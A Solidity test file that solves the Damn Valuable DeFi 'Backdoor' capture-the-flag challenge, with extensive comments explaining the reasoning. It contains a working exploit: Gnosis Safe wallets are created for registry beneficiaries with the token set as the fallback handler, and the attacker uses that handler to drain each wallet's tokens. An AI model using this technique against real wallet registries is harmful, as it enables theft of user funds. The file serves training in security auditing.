// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import {Utilities} from "../utils/Utilities.sol";
import {BaseTest} from "../BaseTest.sol";

import "../../DamnValuableToken.sol";
import "../../backdoor/WalletRegistry.sol";

import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";

import {console} from "forge-std/console.sol";

contract BackdoorTest is BaseTest {

    uint256 constant AMOUNT_TOKENS_DISTRIBUTED = 40 ether;
    uint256 constant AMOUNT_TOKENS_DISTRIBUTED_PER_WALLET = 10 ether;

    address payable attacker;
    address[] beneficiaries;
    
    GnosisSafe masterCopy;
    GnosisSafeProxyFactory walletFactory;
    DamnValuableToken token;
    WalletRegistry walletRegistry;


    constructor() {
        string[] memory labels = new string[](5);
        labels[0] = "Attacker";
        labels[1] = "Alice";
        labels[2] = "Bob";
        labels[3] = "Charlie";
        labels[4] = "David";

        preSetup(5, labels);
    }

    function setUp() public override {
        super.setUp();

        attacker = users[0];

        beneficiaries.push(users[1]);
        beneficiaries.push(users[2]);
        beneficiaries.push(users[3]);
        beneficiaries.push(users[4]);

        // Deploy Gnosis Safe master copy and factory contracts
        masterCopy = new GnosisSafe();
        walletFactory = new GnosisSafeProxyFactory();
        token = new DamnValuableToken();


        vm.label(address(masterCopy), "GnosisSafe");
        vm.label(address(walletFactory), "GnosisSafeProxyFactory");
        vm.label(address(token), "DamnValuableToken");

        // Deploy the registry
        walletRegistry = new WalletRegistry(
            address(masterCopy),
            address(walletFactory),
            address(token),
            beneficiaries
        );
        vm.label(address(walletRegistry), "WalletRegistry");

        // Users are registered as beneficiaries
        for (uint256 i = 0; i < beneficiaries.length; i++) {
            assertTrue(
                walletRegistry.beneficiaries(beneficiaries[i])
            );
        }

        // Transfer tokens to be distributed to the registry
        token.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);
    }

    
    function test_Exploit() public {
        runTest();
    }

    function exploit() internal override {
        /** CODE YOUR EXPLOIT HERE */

        // This challenge require some knowledge how Gnosis Safe contracts works
        // But I think that it's part of what an auditor should be able to do, read the project code
        // Understand on which dependencies or other project it does build on top and find what could go wrong
        // if it integrates with them in the wrong way

        // To create a new proxy wallet via Gnosis Safe you have two options:
        // 1) using `GnosisSafeProxyFactory.createProxyWithCallback` 
        // 2) using `GnosisSafeProxyFactory.createProxyWithNonce` 
        // On top of creating the wallet proxy the `createProxyWithCallback` function have two main differences
        // 1) use the callback as an additional parameter to generate the salt nonce
        // 2) will call the callback after the wallet has been created
        // In this case we need to use the first function because otherwise the `WalletRegistry.proxyCreated` callback
        // would be never called and the DVT token would not be transferred

        // Now that we know how the creation of the proxy works we can see if there are any possible 
        // problems inside the `WalletRegistry` logic
        // When the `proxyCreated` callback is triggered by the Gnosis Proxy Factory the registry will check that
        // 1) it has enough balance to transfer the amount of DVT tokens for each wallet
        // 2) the `msg.sender` of the callback is indeed the GnosisSafeProxyFactory addresses passed in the `constructor` of the registry. 
        // By checking this we know that only the whitelisted factory was able to call the callback
        // 3) the `singleton` used to create the proxy wallet is equal to the `masterCopy` passed in the `constructor` of the registry.
        // By checking this we know for sure that the wallet is an "authentic" one and does not contains malicius code inside
        // 4) The initializer used to initialize the proxy is the correct one (the wallet has been correctly initialized)
        // 5) The wallet threshold of signers needed to execute transaction is equal to 1
        // 6) The walet number of owners is equal to 1. With those checks the registry know that no one other than the wallet's ownwer
        // Will be able to administer it (execute tx, add owners, remove owners and so on)
        // 7) The owner of the wallet is one of the beneficiries listed in the registry. This will prevent the registry to transfer the DVT tokens
        // to someone that has not been initially whitelisted to receive the tokens
        // After all these checks it removes the beneficiary from the list of whitelisted one to prevent that someone abuse and get more DVT tokens 
        // compared to amount it should receive and then transfer the tokens from the registry to the wallet

        // As you can see there are many checks inside this function and it seems pretty safe.
        // Only a wallet with one whitelisted (by the registry) benificiary can receive (only once) 10 DVT token after the callback has been created
        
        // Without the threshold/ownership checks we could have created a wallet with threshold equal to one and with two owners (beneficiary + attacker)
        // and after the transfer we would have executed a transcaction on the wallet to transfer the tokens to the attacker. But this is not a viable option.
        
        // We need to understand how a Gnosis Safe wallets are created and if we can do something during the setup process.
        // These wallets must be very flexible and powerful at the same time to be able to 
        // - receive ERC20/ERC721/... tokens
        // - manage the owners/threshold and all the configurations
        // - be able to execute arbitrary transactions as "call" and "delegatecall"
        // Flexibility and personalization comes with tradeoffs and footguns if they are not configured and used properly
        
        // Our goal is to find a way to create a wallet, with the correct owner (registry beneficiary), correct configuration
        // but with a "backdoor" to be able to transfer the DVT that the registry transfer to the wallet after the creation
        
        // By looking at the `GnosisSafe.setup` function that we call to create the proxy wallet we see that 
        // there's a `fallbackHandler` parameter... if you look inside the `internalSetFallbackHandler` you will see that
        // if that parameter is setup correctly we are able to replace the wallet `fallback` function with an arbitrary
        // low-level call that will "forward" all the payload to `fallbackHandler` executing it directly from the wallet contract...
        // Do you see where we are going? Hell yeah! If we setup the `token` as the `fallbackHandler` we will be able 
        // to execute calls to the token contract directly from the wallet WITHOUT being the owners of the wallet!



        for( uint i = 0; i < beneficiaries.length; i++ ) {
            // setup wallet beneficiary
            address[] memory walletOwners = new address[](1);
            walletOwners[0] = beneficiaries[i];

            // setup the initializer of the wallet by setting the token as the wallet's `fallbackHandler`
            // this will allow us to execute calls to the token contract from the wallet without being the owner
            bytes memory initializer = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)", 
                walletOwners,   // _owners
                1,              // _threshold
                address(0),     // to
                "",             // data
                address(token), // fallbackHandler
                address(0),     // paymentToken
                0,              // payment
                address(0)      // paymentReceiver
            );

            // generate the wallet and call the registry callback
            GnosisSafeProxy proxy = walletFactory.createProxyWithCallback(address(masterCopy), initializer, 1, walletRegistry);


            // use the fallback we setup earlier to directly transfer DVT tokens from the wallet to the attacker!
            vm.prank(attacker);
            (bool approveSuccess, ) = address(proxy).call(
                abi.encodeWithSignature("transfer(address,uint256)", attacker, AMOUNT_TOKENS_DISTRIBUTED_PER_WALLET)
            );
            assertEq(approveSuccess, true);
        }

    }

    function success() internal override {
        /** SUCCESS CONDITIONS */

         for (uint256 i = 0; i < beneficiaries.length; i++) {
            address wallet = walletRegistry.wallets(beneficiaries[i]);
            
            // User must have registered a wallet
            assertTrue(wallet != address(0));

            // User is no longer registered as a beneficiary
            bool userIsStillBeneficiary = walletRegistry.beneficiaries(beneficiaries[i]);
            assertEq(userIsStillBeneficiary, false);
        }

        // Attacker must have taken all tokens
        assertEq(token.balanceOf(attacker), AMOUNT_TOKENS_DISTRIBUTED );
    }
}
